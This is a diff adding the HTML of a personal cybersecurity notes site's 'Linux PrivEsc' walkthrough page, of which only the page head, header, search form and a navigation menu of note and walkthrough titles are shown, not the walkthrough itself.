@@ -1,0 +1,3062 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A collection of notes and writeups from my journey through cyber security concepts.">
+      
+      
+        <meta name="author" content="Nouman Noor">
+      
+      
+        <link rel="canonical" href="https://nanoor.github.io/CyberSec/walkthroughs/thm/linuxprivesc/">
+      
+      
+        <link rel="prev" href="../kenobi/">
+      
+      
+        <link rel="next" href="../metasploitexploitation/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.46">
+    
+    
+      
+        <title>Linux PrivEsc - CyberSec</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.6f8fc17f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#task-1-introduction" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="CyberSec" class="md-header__button md-logo" aria-label="CyberSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.038 4.9 13.461.402a2.86 2.86 0 0 0-2.923.001L2.961 4.9A3.02 3.02 0 0 0 1.5 7.503v8.995c0 1.073.557 2.066 1.462 2.603l7.577 4.497a2.86 2.86 0 0 0 2.922 0l7.577-4.497a3.02 3.02 0 0 0 1.462-2.603V7.503A3.02 3.02 0 0 0 21.038 4.9M15.17 18.946l.013.646c.001.078-.05.167-.111.198l-.383.22c-.061.031-.111-.007-.112-.085l-.007-.635c-.328.136-.66.169-.872.084-.04-.016-.057-.075-.041-.142l.139-.584a.24.24 0 0 1 .069-.121.2.2 0 0 1 .036-.026q.033-.017.062-.006c.229.077.521.041.802-.101.357-.181.596-.545.592-.907-.003-.328-.181-.465-.613-.468-.55.001-1.064-.107-1.072-.917-.007-.667.34-1.361.889-1.8l-.007-.652c-.001-.08.048-.168.111-.2l.37-.236c.061-.031.111.007.112.087l.006.653c.273-.109.511-.138.726-.088.047.012.067.076.048.151l-.144.578a.26.26 0 0 1-.065.116.2.2 0 0 1-.038.028.1.1 0 0 1-.057.009c-.098-.022-.332-.073-.699.113-.385.195-.52.53-.517.778.003.297.155.387.681.396.7.012 1.003.318 1.01 1.023.007.689-.362 1.433-.928 1.888m3.973-1.087c0 .06-.008.116-.058.145l-1.916 1.164c-.05.029-.09.004-.09-.056v-.494c0-.06.037-.093.087-.122l1.887-1.129c.05-.029.09-.004.09.056zm1.316-11.062-7.168 4.427c-.894.523-1.553 1.109-1.553 2.187v8.833c0 .645.26 1.063.66 1.184a2.3 2.3 0 0 1-.398.039c-.42 0-.833-.114-1.197-.33L3.226 18.64a2.5 2.5 0 0 1-1.201-2.142V7.503c0-.881.46-1.702 1.201-2.142L10.803.863a2.34 2.34 0 0 1 2.394 0l7.577 4.498a2.48 2.48 0 0 1 1.164 1.732c-.252-.536-.818-.682-1.479-.296"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CyberSec
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Linux PrivEsc
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1M8 13h8v-2H8zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4a5 5 0 0 0 5-5 5 5 0 0 0-5-5"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="black"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="black"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../notes/misc/shellstabilisation/" class="md-tabs__link">
+          
+  
+    
+  
+  Notes
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../activedirectorybasics/" class="md-tabs__link">
+          
+  
+    
+  
+  Walkthroughs
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="CyberSec" class="md-nav__button md-logo" aria-label="CyberSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.038 4.9 13.461.402a2.86 2.86 0 0 0-2.923.001L2.961 4.9A3.02 3.02 0 0 0 1.5 7.503v8.995c0 1.073.557 2.066 1.462 2.603l7.577 4.497a2.86 2.86 0 0 0 2.922 0l7.577-4.497a3.02 3.02 0 0 0 1.462-2.603V7.503A3.02 3.02 0 0 0 21.038 4.9M15.17 18.946l.013.646c.001.078-.05.167-.111.198l-.383.22c-.061.031-.111-.007-.112-.085l-.007-.635c-.328.136-.66.169-.872.084-.04-.016-.057-.075-.041-.142l.139-.584a.24.24 0 0 1 .069-.121.2.2 0 0 1 .036-.026q.033-.017.062-.006c.229.077.521.041.802-.101.357-.181.596-.545.592-.907-.003-.328-.181-.465-.613-.468-.55.001-1.064-.107-1.072-.917-.007-.667.34-1.361.889-1.8l-.007-.652c-.001-.08.048-.168.111-.2l.37-.236c.061-.031.111.007.112.087l.006.653c.273-.109.511-.138.726-.088.047.012.067.076.048.151l-.144.578a.26.26 0 0 1-.065.116.2.2 0 0 1-.038.028.1.1 0 0 1-.057.009c-.098-.022-.332-.073-.699.113-.385.195-.52.53-.517.778.003.297.155.387.681.396.7.012 1.003.318 1.01 1.023.007.689-.362 1.433-.928 1.888m3.973-1.087c0 .06-.008.116-.058.145l-1.916 1.164c-.05.029-.09.004-.09-.056v-.494c0-.06.037-.093.087-.122l1.887-1.129c.05-.029.09-.004.09.056zm1.316-11.062-7.168 4.427c-.894.523-1.553 1.109-1.553 2.187v8.833c0 .645.26 1.063.66 1.184a2.3 2.3 0 0 1-.398.039c-.42 0-.833-.114-1.197-.33L3.226 18.64a2.5 2.5 0 0 1-1.201-2.142V7.503c0-.881.46-1.702 1.201-2.142L10.803.863a2.34 2.34 0 0 1 2.394 0l7.577 4.498a2.48 2.48 0 0 1 1.164 1.732c-.252-.536-.818-.682-1.479-.296"/></svg>
+
+    </a>
+    CyberSec
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Notes
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Notes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Misc
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Misc
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/misc/shellstabilisation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Shell Stabilisation
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Network
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Network
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/network/dns/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/network/osimodel/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OSI Model
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Privilege Escalation (Linux)
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Privilege Escalation (Linux)
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/privesc_linux/crontab/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cron Jobs
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/privesc_linux/passwdshadow/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Passwd/Shadow File
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/privesc_linux/pathvariable/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Path Variable
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/privesc_linux/suid/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SUID
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Walkthroughs
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Walkthroughs
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    THM
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            THM
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../activedirectorybasics/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory Basics
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2" id="__nav_3_1_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Advent of Cyber 2022
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            Advent of Cyber 2022
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day1/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 1 - Frameworks
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day2/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 2 - Log Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day3/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 3 - OSINT
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day4/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 4 - Scanning
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 5 - Brute Force
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 6 - Email Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day7/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 7 - Cyber Chef
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 8 - Smart Contracts
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day9/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 9 - Pivoting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day10/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 10 - Hack a Game
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day11/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 11 - Memory Forensics
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day12/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 12 - Malware Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day13/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 13 - Packet Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day14/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 14 - Web Applications
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day15/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 15 - Secure Coding (Securing File Upload)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day16/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 16 - Secure Coding (SQLi)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day17/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 17 - Secure Coding (Regular Expressions)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day18/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 18 - Sigma
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day19/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 19 - Hardware Hacking
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day20/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 20 - Firmware Reverse Engineering
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day21/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 21 - MQTT
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../authenticationbypass/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Authentication Bypass
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../basicpentesting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Basic Pentesting
+  </span>
+  
+
+      </a>
+    </li>
